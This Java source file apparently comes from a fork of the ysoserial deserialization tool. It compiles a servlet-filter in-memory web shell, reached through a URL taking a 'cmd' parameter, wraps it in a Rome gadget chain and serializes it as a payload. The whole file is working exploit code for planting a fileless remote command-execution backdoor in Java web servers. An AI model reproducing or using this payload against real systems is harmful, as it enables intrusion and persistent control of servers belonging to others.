package ysoserial.payloads.memshell;

import org.apache.commons.io.IOUtils;
import ysoserial.Serializer;
import ysoserial.payloads.Eval;
import ysoserial.payloads.RomeTools;
import ysoserial.payloads.util.ClassFiles;
import ysoserial.payloads.util.JavaCompiler;
import ysoserial.payloads.util.ReadWrite;

import java.io.InputStream;

//filter 内存马 /1nhann?cmd=id
public class FilterShell {
    public static void main(final String[] args) throws Exception {
        Object evil = new FilterShell().getObject(RomeTools.class);
        byte[] ser = Serializer.serialize(evil);
    }

    public Object getObject(Class gadget) throws Exception {
        byte[] bytes = ReadWrite.readResource(FilterShell.class,"内存马/FilterShell.java");
        String java = new String(bytes);
        byte[] b = JavaCompiler.compile("FilterShell",java);
        Class c = ClassFiles.bytesAsClass(b);
        Object o = new Eval().getObject(gadget,c);
        return o;
    }

}
